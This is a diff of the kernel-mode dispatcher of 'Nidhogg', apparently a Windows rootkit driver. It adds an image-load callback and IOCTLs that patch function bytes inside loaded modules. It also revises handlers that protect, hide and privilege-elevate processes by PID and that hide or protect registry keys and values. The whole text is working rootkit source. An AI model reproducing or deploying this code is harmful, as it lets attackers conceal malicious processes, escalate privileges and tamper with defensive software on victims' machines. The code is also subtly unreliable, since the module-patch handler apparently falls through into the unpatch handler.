@@ -1,8 +1,6 @@
 #include "pch.h"
 #include "Nidhogg.h"
-#include "ProcessUtils.hpp"
-#include "FileUtils.hpp"
-#include "RegistryUtils.hpp"
+#include "NidhoggUtils.h"
 
 extern "C"
 NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING) {
@@ -10,6 +8,8 @@ NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING) {
 	pGlobals.Init();
 	fGlobals.Init();
 	rGlobals.Init();
+	pmGlobals.Init();
+	dimGlobals.Init();
 
 	// Setting up the device object.
 	UNICODE_STRING deviceName = RTL_CONSTANT_STRING(DRIVER_DEVICE_NAME);
@@ -68,10 +68,26 @@ NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING) {
 		return status;
 	}
 
+	status = PsSetLoadImageNotifyRoutine(OnImageLoad);
+
+	if (!NT_SUCCESS(status)) {
+		KdPrint((DRIVER_PREFIX "failed to register image notify callback: (0x%08X)\n", status));
+
+		if (registrationHandle) {
+			ObUnRegisterCallbacks(registrationHandle);
+			registrationHandle = NULL;
+		}
+		IoDeleteSymbolicLink(&symbolicLink);
+		IoDeleteDevice(DeviceObject);
+		return status;
+	}
+
 	status = CmRegisterCallbackEx(OnRegistryNotify, &regAltitude, DriverObject, nullptr, &rGlobals.RegCookie, nullptr);
 
 	if (!NT_SUCCESS(status)) {
 		KdPrint((DRIVER_PREFIX "failed to register registry callback: (0x%08X)\n", status));
+
+		PsRemoveLoadImageNotifyRoutine(OnImageLoad);
 
 		if (registrationHandle) {
 			ObUnRegisterCallbacks(registrationHandle);
@@ -91,7 +107,16 @@ NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING) {
 	return status;
 }
 
-
+/*
+* Description:
+* NidhoggUnload is responsible for handling the driver unloading process which includes: Removing all hooks, deleting the symbolic link and the deviceobject.
+*
+* Parameters:
+* @DriverObject [PDRIVER_OBJECT] -- The driver object contains a lot of important driver configuration such as DeviceObject, MajorFunctions and more.
+*
+* Returns:
+* There is no return value.
+*/
 void NidhoggUnload(PDRIVER_OBJECT DriverObject) {
 	KdPrint((DRIVER_PREFIX "Unloading...\n"));
 
@@ -100,6 +125,13 @@ void NidhoggUnload(PDRIVER_OBJECT DriverObject) {
 	if (!NT_SUCCESS(status)) {
 		KdPrint((DRIVER_PREFIX "failed to unregister registry callbacks: (0x%08X)\n", status));
 	}
+
+	status = PsRemoveLoadImageNotifyRoutine(OnImageLoad);
+
+	if (!NT_SUCCESS(status)) {
+		KdPrint((DRIVER_PREFIX "failed to unregister image load callback: (0x%08X)\n", status));
+	}
+
 	ClearAll();
 
 	// To avoid BSOD.
@@ -113,7 +145,18 @@ void NidhoggUnload(PDRIVER_OBJECT DriverObject) {
 	IoDeleteDevice(DriverObject->DeviceObject);
 }
 
-
+/*
+* Description:
+* CompleteIrp is responsible for handling the status return via the IRP.
+*
+* Parameters:
+* @Irp	   [PIRP]	   -- The IRP that contains the request's status.
+* @status  [NTSTATUS]  -- The status to assign to the IRP.
+* @info    [ULONG_PTR] -- Additional information to assign to the IRP.
+*
+* Returns:
+* @status [NTSTATUS]   -- The given status parameter.
+*/
 NTSTATUS CompleteIrp(PIRP Irp, NTSTATUS status, ULONG_PTR info) {
 	Irp->IoStatus.Status = status;
 	Irp->IoStatus.Information = info;
@@ -121,7 +164,17 @@ NTSTATUS CompleteIrp(PIRP Irp, NTSTATUS status, ULONG_PTR info) {
 	return status;
 }
 
-
+/*
+* Description:
+* NidhoggCreateClose is responsible for creating a success response for given IRP.
+*
+* Parameters:
+* @DeviceObject [PDEVICE_OBJECT] -- Not used.
+* @Irp			[PIRP]			 -- The IRP that contains the user data such as SystemBuffer, Irp stack, etc.
+*
+* Returns:
+* @status		[NTSTATUS]		 -- Always will be STATUS_SUCCESS.
+*/
 NTSTATUS NidhoggCreateClose(PDEVICE_OBJECT, PIRP Irp) {
 	Irp->IoStatus.Status = STATUS_SUCCESS;
 	Irp->IoStatus.Information = 0;
@@ -129,7 +182,18 @@ NTSTATUS NidhoggCreateClose(PDEVICE_OBJECT, PIRP Irp) {
 	return STATUS_SUCCESS;
 }
 
-
+/*
+* Description: 
+* NidhoggDeviceControl is responsible for handling IOCTLs and returning output to the user via IRPs. 
+* Every user communication should go through this function using the relevant IOCTL.
+* 
+* Parameters:
+* @DeviceObject [PDEVICE_OBJECT] -- Not used.
+* @Irp			[PIRP]			 -- The IRP that contains the user data such as SystemBuffer, Irp stack, etc.
+* 
+* Returns:
+* @status		[NTSTATUS]		 -- Whether the function succeeded or not, if not the error code.
+*/
 NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 	auto stack = IoGetCurrentIrpStackLocation(Irp);
 	auto status = STATUS_SUCCESS;
@@ -147,31 +211,28 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 
 		auto data = (ULONG*)Irp->AssociatedIrp.SystemBuffer;
 
+		if (data == 0) {
+			status = STATUS_INVALID_PARAMETER;
+			break;
+		}
+
 		AutoLock locker(pGlobals.Lock);
 
-		for (int i = 0; i < size / sizeof(ULONG); i++) {
-			auto pid = data[i];
-			if (pid == 0) {
-				status = STATUS_INVALID_PARAMETER;
-				break;
-			}
-			if (FindProcess(pid))
-				continue;
+		if (FindProcess(*data))
+			break;
 
-			if (pGlobals.Processes.PidsCount == MAX_PIDS) {
-				status = STATUS_TOO_MANY_CONTEXT_IDS;
-				break;
-			}
-
-			if (!AddProcess(pid)) {
-				status = STATUS_UNSUCCESSFUL;
-				break;
-			}
-
-			KdPrint((DRIVER_PREFIX "Protecting process with pid %d.\n", pid));
-
-			len += sizeof(ULONG);
+		if (pGlobals.Processes.PidsCount == MAX_PIDS) {
+			status = STATUS_TOO_MANY_CONTEXT_IDS;
+			break;
 		}
+
+		if (!AddProcess(*data)) {
+			status = STATUS_UNSUCCESSFUL;
+			break;
+		}
+
+		KdPrint((DRIVER_PREFIX "Protecting process with pid %d.\n", *data));
+		len += sizeof(ULONG);
 
 		break;
 	}
@@ -186,26 +247,25 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 
 		auto data = (ULONG*)Irp->AssociatedIrp.SystemBuffer;
 
+		if (data == 0) {
+			status = STATUS_INVALID_PARAMETER;
+			break;
+		}
+
 		AutoLock locker(pGlobals.Lock);
 
-		for (int i = 0; i < size / sizeof(ULONG); i++) {
-			auto pid = data[i];
-
-			if (pid == 0) {
-				status = STATUS_INVALID_PARAMETER;
-				break;
-			}
-
-			if (!RemoveProcess(pid)) {
-				status = STATUS_NOT_FOUND;
-				break;
-			}
-
-			len += sizeof(ULONG);
-
-			if (pGlobals.Processes.PidsCount == 0)
-				break;
+		if (pGlobals.Processes.PidsCount == 0) {
+			status = STATUS_NOT_FOUND;
+			break;
 		}
+
+		if (!RemoveProcess(*data)) {
+			status = STATUS_NOT_FOUND;
+			break;
+		}
+
+		KdPrint((DRIVER_PREFIX "Unprotecting process with pid %d.\n", *data));
+		len += sizeof(ULONG);
 
 		break;
 	}
@@ -228,19 +288,17 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 
 		auto data = (ULONG*)Irp->AssociatedIrp.SystemBuffer;
 
-		for (int i = 0; i < size / sizeof(ULONG); i++) {
-			auto pid = data[i];
-
-			if (pid == 0) {
-				status = STATUS_INVALID_PARAMETER;
-				break;
-			}
-
-			if (!NT_SUCCESS(HideProcess(pid))) {
-				status = STATUS_UNSUCCESSFUL;
-				break;
-			}
+		if (data == 0) {
+			status = STATUS_INVALID_PARAMETER;
+			break;
 		}
+
+		if (!NT_SUCCESS(HideProcess(*data))) {
+			status = STATUS_UNSUCCESSFUL;
+			break;
+		}
+
+		KdPrint((DRIVER_PREFIX "Hid process with pid %d.\n", *data));
 		break;
 	}
 
@@ -252,21 +310,20 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 			status = STATUS_INVALID_BUFFER_SIZE;
 			break;
 		}
+
 		auto data = (ULONG*)Irp->AssociatedIrp.SystemBuffer;
 
-		for (int i = 0; i < size / sizeof(ULONG); i++) {
-			auto pid = data[i];
-
-			if (pid == 0) {
-				status = STATUS_INVALID_PARAMETER;
-				break;
-			}
-
-			if (!NT_SUCCESS(ElevateProcess(data[i]))) {
-				status = STATUS_UNSUCCESSFUL;
-				break;
-			}
+		if (data == 0) {
+			status = STATUS_INVALID_PARAMETER;
+			break;
 		}
+
+		if (!NT_SUCCESS(ElevateProcess(*data))) {
+			status = STATUS_UNSUCCESSFUL;
+			break;
+		}
+
+		KdPrint((DRIVER_PREFIX "Elevated process with pid %d.\n", *data));
 		break;
 	}
 
@@ -565,8 +622,7 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 		AutoLock locker(rGlobals.Lock);
 
 		if ((data->Type != REG_TYPE_PROTECTED_KEY && data->Type != REG_TYPE_HIDDEN_KEY &&
-			data->Type != REG_TYPE_PROTECTED_VALUE && data->Type != REG_TYPE_HIDDEN_VALUE) ||
-			wcslen((*data).KeyPath) == 0) {
+			data->Type != REG_TYPE_PROTECTED_VALUE && data->Type != REG_TYPE_HIDDEN_VALUE)) {
 			KdPrint((DRIVER_PREFIX "Invalid buffer.\n"));
 			status = STATUS_INVALID_PARAMETER;
 			break;
@@ -705,6 +761,79 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 		break;
 	}
 
+	case IOCTL_NIDHOGG_PATCH_MODULE:
+	{
+		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;
+
+		if (size % sizeof(PatchedModule) != 0) {
+			KdPrint((DRIVER_PREFIX "Invalid buffer type.\n"));
+			status = STATUS_INVALID_BUFFER_SIZE;
+			break;
+		}
+
+		auto data = (PatchedModule*)Irp->AssociatedIrp.SystemBuffer;
+
+		if (strlen((*data).FunctionName) == 0 || wcslen((*data).ModuleName) == 0 || strlen((char*)(*data).Patch) == 0) {
+			KdPrint((DRIVER_PREFIX "Buffer is empty.\n"));
+			status = STATUS_INVALID_PARAMETER;
+			break;
+		}
+
+		AutoLock locker(pmGlobals.Lock);
+
+		if (pmGlobals.ModulesList.PatchedModulesCount == MAX_PATCHED_MODULES) {
+			KdPrint((DRIVER_PREFIX "Module list is full.\n"));
+			status = STATUS_TOO_MANY_CONTEXT_IDS;
+			break;
+		}
+
+		if (!FindModule(*data)) {
+			if (!AddModule(*data)) {
+				KdPrint((DRIVER_PREFIX "Failed to add module.\n"));
+				status = STATUS_UNSUCCESSFUL;
+				break;
+			}
+			
+			auto prevIrql = KeGetCurrentIrql();
+			KeLowerIrql(PASSIVE_LEVEL);
+			KdPrint((DRIVER_PREFIX "Patching module %ws.\n", (*data).ModuleName));
+			KeRaiseIrql(prevIrql, &prevIrql);
+			break;
+		}
+	}
+
+	case IOCTL_NIDHOGG_UNPATCH_MODULE:
+	{
+		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;
+
+		if (size % sizeof(PatchedModule) != 0) {
+			KdPrint((DRIVER_PREFIX "Invalid buffer type.\n"));
+			status = STATUS_INVALID_BUFFER_SIZE;
+			break;
+		}
+
+		auto data = (PatchedModule*)Irp->AssociatedIrp.SystemBuffer;
+
+		if (strlen((*data).FunctionName) == 0 || wcslen((*data).ModuleName) == 0) {
+			KdPrint((DRIVER_PREFIX "Buffer is empty.\n"));
+			status = STATUS_INVALID_PARAMETER;
+			break;
+		}
+
+		AutoLock locker(pmGlobals.Lock);
+
+		if (!RemoveModule(*data)) {
+			KdPrint((DRIVER_PREFIX "Module not found.\n"));
+			status = STATUS_NOT_FOUND;
+			break;
+		}
+		auto prevIrql = KeGetCurrentIrql();
+		KeLowerIrql(PASSIVE_LEVEL);
+		KdPrint((DRIVER_PREFIX "Removed patched module %ws.\n", (*data).ModuleName));
+		KeRaiseIrql(prevIrql, &prevIrql);
+		break;
+	}
+
 	default:
 		status = STATUS_INVALID_DEVICE_REQUEST;
 		break;
@@ -716,6 +845,16 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 	return status;
 }
 
+/*
+* Description:
+* ClearAll is responsible for freeing all allocated memory and cleaning all the globals.
+*
+* Parameters:
+* There are no parameters.
+*
+* Returns:
+* There is no return value.
+*/
 void ClearAll() {
 	// Clearing the process array.
 	AutoLock processLocker(pGlobals.Lock);
@@ -753,4 +892,19 @@ void ClearAll() {
 		rGlobals.ProtectedItems.Values.ValuesName[i] = nullptr;
 	}
 	rGlobals.ProtectedItems.Values.ValuesCount = 0;
+	
+	AutoLock moduleLocker(pmGlobals.Lock);
+	
+	for (int i = 0; i < pmGlobals.ModulesList.PatchedModulesCount; i++) {
+		if (pmGlobals.ModulesList.Modules[i].FunctionName)
+			ExFreePoolWithTag(pmGlobals.ModulesList.Modules[i].FunctionName, DRIVER_TAG);
+		if (pmGlobals.ModulesList.Modules[i].ModuleName)
+			ExFreePoolWithTag(pmGlobals.ModulesList.Modules[i].ModuleName, DRIVER_TAG);
+		if (pmGlobals.ModulesList.Modules[i].Patch)
+			ExFreePoolWithTag(pmGlobals.ModulesList.Modules[i].Patch, DRIVER_TAG);
+		pmGlobals.ModulesList.Modules[i].FunctionName = nullptr;
+		pmGlobals.ModulesList.Modules[i].ModuleName = nullptr;
+		pmGlobals.ModulesList.Modules[i].Patch = nullptr;
+	}
+	pmGlobals.ModulesList.PatchedModulesCount = 0;
 }
